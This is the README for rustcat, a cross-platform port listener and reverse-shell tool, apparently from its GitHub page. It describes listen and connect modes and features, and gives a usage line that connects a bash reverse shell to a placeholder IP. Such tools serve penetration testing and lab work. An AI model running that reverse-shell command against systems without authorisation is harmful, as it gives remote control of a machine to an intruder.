<div align="center">
      <h1>rustcat - The modern port listener and reverse shell </h1>
</div>

<p align="center">
	<img alt="GitHub All Releases" src="https://img.shields.io/github/downloads/robiot/rustcat/total?label=GitHub%20Downloads" />
  	<a href="https://aur.archlinux.org/packages/rustcat"><img alt="AUR version" src="https://img.shields.io/aur/version/rustcat" /></a>
  	<img alt="GitHub Issues" src="https://img.shields.io/github/issues/robiot/rustcat.svg" />
  	<img alt="GitHub Contributors" src="https://img.shields.io/github/contributors/robiot/rustcat" /></a>
</p>

## What is Rustcat
Rustcat is an easy to use port listener and reverse shell for Linux, MacOS, and Windows aimed to be easy to use and accessible.

![image](https://user-images.githubusercontent.com/68228472/184684103-87bf3af8-0607-4789-b3a2-09ce67efce55.jpg)

## Modes
- Listen mode (listen);
- Reverse shell mode (connect);

## Featurees
- Command history & Tab completion (Interactive mode);
- CTRL-C blocking
- Colors;
- Everything easy;

## Installing
Check out the [Installation Guide](https://github.com/robiot/rustcat/wiki/Installation-Guide). Or if you want to have it portable, check out the [latest release](https://github.com/robiot/rustcat/releases/latest)

## Usage
The most basic and useful example to start listening on a port would be:
```
rcat listen -ib 55600
```
and to connect:
```
rcat connect -s bash the.0.0.ip 55600
```

For some more basic usage, check [here](https://github.com/robiot/rustcat/wiki/Basic-Usage)

## Disclaimer
This tool may be used for educational purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.
